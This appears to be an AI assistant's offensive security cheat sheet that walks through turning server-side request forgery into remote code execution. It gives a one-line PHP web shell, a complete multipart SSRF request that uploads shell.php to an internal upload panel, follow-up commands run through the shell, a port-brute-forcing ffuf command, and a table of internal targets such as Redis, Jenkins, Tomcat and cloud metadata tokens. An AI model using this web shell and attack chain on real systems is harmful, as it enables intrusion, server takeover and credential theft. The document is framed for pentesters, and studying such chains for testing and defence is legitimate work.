### 💀 SSRF to Web Shell Injection – Realistic Exploitation Chain

---

When **Server-Side Request Forgery (SSRF)** is present, and you can target internal services, **one powerful post-SSRF move** is achieving **remote code execution (RCE)** by injecting a **web shell** into an internal web service.

---

## 🧠 TL;DR Exploitation Flow

```
SSRF ➜ Internal Service (e.g., PHP, admin panel) ➜ Inject Web Shell ➜ RCE
```

---

## 🔧 Preconditions

To go from SSRF → Web Shell Injection, you usually need:

| Requirement                              | Example                                                                                                |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| SSRF vuln                                | You control `url=` or similar param                                                                    |
| Internal service reachable via SSRF      | e.g., [http://localhost:8080](http://localhost:8080), [http://127.0.0.1/admin](http://127.0.0.1/admin) |
| File write or command injection via SSRF | You can POST malicious data                                                                            |
| Web root is writable                     | e.g., /var/www/html                                                                                    |
| Interpreter available                    | PHP, ASP, JSP, etc.                                                                                    |

---

## 🔥 Realistic Scenario

### Target SSRF Input:

```http
POST /fetch?url=http://localhost/upload HTTP/1.1
Host: victim.com
```

### Internal Admin Upload Panel:

* `http://127.0.0.1:8080/upload`
* Accepts image uploads or file content via POST
* Saves to `/var/www/html/uploads/`

---

## 💣 Payload: Web Shell (PHP)

```php
<?php system($_GET['cmd']); ?>
```

---

## 🔁 SSRF Request to Upload Web Shell

Send this **POST SSRF** to target internal uploader:

```http
POST /ssrf?url=http://127.0.0.1:8080/upload HTTP/1.1
Host: victim.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

If the internal service **stores the file in webroot**, it may become accessible like:

```
http://victim.com/uploads/shell.php?cmd=id
```

---

## ✅ Then You Can...

* Run commands:

  ```
  shell.php?cmd=whoami
  shell.php?cmd=ls
  ```
* Upload a full backdoor (e.g., reverse shell)
* Pivot further into the network

---

## 🛑 Real-World Targets You Could Hit via SSRF

| Internal App   | Common Path              | Vulnerability                                       |
| -------------- | ------------------------ | --------------------------------------------------- |
| Jenkins        | `/script`, `/createItem` | Groovy injection                                    |
| Redis          | `http://localhost:6379`  | Write cron jobs or web shells (via Gopher SSRF)     |
| Tomcat         | `/manager/html`          | Deploy WAR file                                     |
| GitLab         | `/api/v4/`               | Internal APIs                                       |
| Webmin         | `/filemin/`              | File upload / RCE                                   |
| Cloud Metadata | `http://169.254.169.254` | Steal AWS tokens (then abuse S3 for web shell drop) |

---

## 🧪 Tools to Automate

* 🐍 `ffuf`, `Burp`, or `httpx` to discover SSRF behavior
* 🦊 `Gopherus` to exploit Redis SSRF
* 🐚 `Interactsh` to detect successful command execution
* 🧠 `ffuf -u 'http://target.com/ssrf?url=http://127.0.0.1:FUZZ'` to brute internal services

---

## 📍 Detection for Pentesters

If you find SSRF:

1. Check for:

   * Access to `localhost`, `127.0.0.1`, or internal hostnames
   * POST request forwarding support
2. Probe for internal apps (open ports: 80, 8080, 5000, 6379, 7001, etc.)
3. Upload payloads:

   * `.php`, `.jsp`, `.html`, `.htaccess`, etc.
4. Monitor for OOB requests or confirm with a GET to the shell

---

Want a live test lab (like DVWA or SSRF-Lab) to practice this chain on?
